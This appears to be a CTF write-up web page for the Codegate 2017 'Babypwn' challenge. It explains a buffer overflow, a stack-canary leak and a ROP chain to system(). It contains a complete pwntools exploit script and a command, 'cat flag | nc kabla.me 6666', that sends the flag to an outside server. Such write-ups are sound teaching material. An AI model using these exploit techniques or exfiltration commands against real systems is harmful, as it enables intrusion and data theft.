<!DOCTYPE html>
<html lang="en">

    <?php
      include('../includes/headers.php');
      include('../includes/navbar.php');
      include('../includes/footers.php');
      print getHeaders('Codegate-Prequals-2017');
    ?>

<body>

    <?php
      print getNavbar(1);
    ?>

    <header class="intro-header" >
        <div class="container">
            <div class="row">
                <div class="col-lg-6 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="post-heading">
                        <h2><img src="../img/codegagte-prequals.2017.logo.png" width="60%" height="60%" alt="logo" align="center"> </h2>
                        <span class="meta">Posted by <a href="#">kablaa</a> Feburary, 2017</span>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- begn challenge list -->
    <div class="container">
        <div class = "row">
                <div class="post-body col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">
                    <div class = "list-group">
                        <a href="#babypwn" class = "list-group-item">Babypwn<span class ="badge">Pwn-50</span></a>
                    </div>
                </div>
        </div>
    </div>
    <!-- Post Content -->
    <article>
        <div class="container">
            <div class="row">
                <div class="post-body col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">
                    <h1 id="babypwn">Babypwn (Pwn-50)</h1>
                    <p>
                      For this challenge, we were given a binary with a simple echo functionality. Here is the decomailed main loop, which contains the core functionality.

                      <pre>
                        <code class="language-c">
    int main_loop()
    {
      int user_selection;
      char echo_buf[40];
      memset(echo_buf, 0, sizeof(echo_buf));
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_str("\n===============================\n");
            print_str("1. Echo\n");
            print_str("2. Reverse Echo\n");
            print_str("3. Exit\n");
            print_str("===============================\n");
            user_selection = get_user_selection();
            if ( user_selection != 1 )
              break;
            print_str("Input Your Message : "); // Echo Functionality
            get_user_string(echo_buf, 100); //overflow
            print_str(echo_buf);
          }
          if ( user_selection != 2 )
            break;
          print_str("Input Your Message : "); // reverse echo funcitonality
          get_user_string(echo_buf, 100); //overflow
          reverse_str(echo_buf);
          print_str(echo_buf);
        }
        if ( user_selection == 3 )
          break;
        print_str("\n[!] Wrong Input\n");
      }
    }
                        </code>
                      </pre>

                      So we are reading 100 bytes into a 40 byte buffer, a simple buffer overflow. They were even nice enough to give us a <code>plt</code> address of <code>system</code> by adding a hidden function:

                    <pre>
                      <code class = "language-c">
int system_call()
{
  system("echo 'not easy to see.'");
}
                      </code>
                    </pre>
 However, there are a few things that make solving this challenge a bit more complicated.

                      <li>Stack Canaries are enabled, so we are going to have to find a way around them.</li>
                      <li>DEP is enabled, so shellcode is out of the question.</li>
                      <li>All I/O is handled by a TCP socket, which means simply calling <code>system("cat flag")</code> will not work, as this will not send the flag over the socket</li>
                    </p>

                    <h2>Defeating The Stack Canary</h2>
                    <p>
                      Let's take a look at the <code>print_str</code> function:
                      <pre>
                        <code class="language-c">
int print_str(const char *buf)
{
  return send(fd, buf, strlen(buf), 0);
}
                        </code>
                      </pre>
                      The key here is the use of <code>strlen</code>, which determines the end of a string by searching for the first occurence of a <code>NULL</code> byte. Another important thing to note is the fact that the first byte of a canary is always a <code>NULL</code> byte. This is apparently for the pupose of adding an extra layer of security, so that functions such as <code>printf</code> will not print a canary. Becuase we control the length of <code>buf</code>, we can overflow our buffer in such a way that our <code>\n</code> character overwrites the first byte (the <code>NULL</code> byte) of the canary. Because we are still nested inbetween 2 infinite loops, the <code>main_loop</code> function will not actually return, thus we can leak the canary and can continue our journey to <code>EIP</code>.
                    </p>
                    <h2>Working around the I/O</h2>
                    <p>
                      Because all I/O is handled with the <code>send</code> and <code>recv</code> functions, we are going to have to find a creative way of actually getting the flag. My plan was to set up a netcat server on my VPS and use <code>system</code> to execute the command
                      <pre>
cat flag | nc kabla.me 6666
                      </pre>
                    </p>
                    <h2>The Exploit</h2>
                      <p>

                        <li>FOpen up <code>port 6666</code> on my VPS and set up my tcp server: <code>nc -l 6666</code></li>
                        <li>Exploit <code>strlen</code> and the overflow to leak the canary</li>
                        <li>Put the canary back and overwrite <code>EIP</code> with my ROP chain</li>
                        <li>Use the <code>recv</code> function to write my command into memory. We need to use writable memory, I chose the <code>.data</code> section.</li>
                        <li>Finally, we call <code>system</code> and pass the address of our command to it</li>
                      </p>


                    <p>
                      <!--add a link to ropgadget here-->
                      <a href="https://github.com/JonathanSalwan/ROPgadget">ropgadget</a> reviels a handy gadget that we can use to help us call the <code>recv</code> function
                      <pre>
0x08048eec : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
                      </pre>
                      Here is my <code>exploit.py</code></p>
                    <pre>
                      <code class="language-python">
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

HOST = 'localhost'
# HOST = '110.10.212.130'
PORT = 8888
echo = '1'
reverse_echo = '2'
exit = '3'

exe = ELF('babypwn')
system_plt = exe.plt['system']
log.info("system: " + hex(system_plt))
recv_plt = exe.plt['recv']
log.info("recv : "  + hex(recv_plt))

cmd = "cat flag | nc kabla.me 6666"
bytes_to_canary = 40

r = remote(HOST,PORT)

#getting leaked canary
r.recv()
r.sendline(echo)
time.sleep(.1)
r.recv()
payload = "A" *(bytes_to_canary)
r.sendline(payload)
time.sleep(.1)
data = r.recv()
canary = u32("\x00" +data[bytes_to_canary+1:bytes_to_canary+1+3] )
log.info("canary: " + hex(canary))

#build da ROP chain
rop = ROP(exe)
ppppr = rop.find_gadget(["pop ebx","pop esi"])
log.info("found gadget at:" +  hex(ppppr.address))

system_arg = 0x804b080 # .data section
rop.raw(canary)
rop.raw(0xdeadbeef)
rop.raw(0xdeadbeef)
rop.raw(0xdeadbeef)
rop.raw(recv_plt)
rop.raw(ppppr) # our gadget
rop.raw(0x4) #socket file descriptor
rop.raw(system_arg) #our command should be written here
rop.raw(len(cmd))
rop.raw(0) #flag for recv
rop.raw(system_plt)
rop.raw(0xdeadbeef)
rop.raw(system_arg)
log.info("ROP chain: " + rop.dump())

payload = "A"*bytes_to_canary
payload += str(rop)

#selecting the echo functionality
r.sendline(echo)
time.sleep(.1)
r.recv()

#sending our payload
r.sendline(payload)
time.sleep(.1)
r.recv()
#exit so that we will return
r.sendline(exit)
time.sleep(.1)

# pass our command to recv
r.sendline(cmd)

                      </code>
                    </pre>
                    <pre>
FLAG{Good_Job~!Y0u_@re_Very__G@@d!!!!!!^.^}
                    </pre>
                </div>
            </div>
        </div>
    </article>

    <hr>

    <!-- Footer -->
<?php
      print getFooters();
?>

</body>

</html>
